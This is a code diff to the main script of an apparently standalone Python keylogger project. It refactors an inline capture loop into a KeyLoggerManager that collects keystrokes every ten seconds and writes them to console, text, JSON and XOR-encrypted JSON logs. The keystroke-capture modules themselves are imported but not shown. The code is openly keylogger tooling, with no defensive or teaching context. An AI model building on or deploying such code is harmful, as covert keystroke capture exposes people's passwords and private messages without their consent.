@@ -1,36 +1,18 @@
-# Initialize components
-import time
-from datetime import datetime
-
 from keylogger.encryptors import XorEncryption
 from keylogger.keyloggers import SimpleKeylogger
-from keylogger.logwriters import ConsoleLogWriter
-from keylogger.logwriters import FileLogWriter
-from keylogger.logwriters import JsonLogWriter
+from keylogger.logwriters import JsonLogWriter, ConsoleLogWriter, FileLogWriter
+from keylogger.manager import KeyLoggerManager
 
-if __name__ == '__main__':
+if __name__ == "__main__":
+    # Initialize components
     keylogger = SimpleKeylogger()
-    # log_writer = ConsoleLogWriter()
-    # log_writer = FileLogWriter("logdict_new")
-    log_writer = JsonLogWriter("file1")
+    console_log_writer = ConsoleLogWriter()
+    txt_log_writer = FileLogWriter("log1")
+    json_log_writer = JsonLogWriter("file1_new")
+    encrypted_log_writer = JsonLogWriter("file1_new_encrypted")
     encryptor = XorEncryption()
-    seconds_to_sleep = 10
+    interval = 10  # Log collection interval in seconds
 
-    # Start the keylogger
-    keylogger.start()
-
-    try:
-        while keylogger.running:
-            time.sleep(seconds_to_sleep)  # Send logs every 10 seconds
-            logs = keylogger.get_log()
-            if logs:
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                log_to_write = {timestamp: logs}
-                # encrypted_logs = encryptor.get_encrypted_dict(encryptor.encrypt, log_to_write)
-
-                log_writer.write_log(log_to_write)
-                # log_writer.write_log(encrypted_logs)
-                # log_writer.write_log(encryptor.get_encrypted_dict(encryptor.decrypt, encrypted_logs))
-    except KeyboardInterrupt:
-        keylogger.stop()
-        print("Keylogger stopped.")
+    # Start the keylogger manager
+    manager = KeyLoggerManager(keylogger, json_log_writer, encrypted_log_writer, encryptor, interval)
+    manager.start()
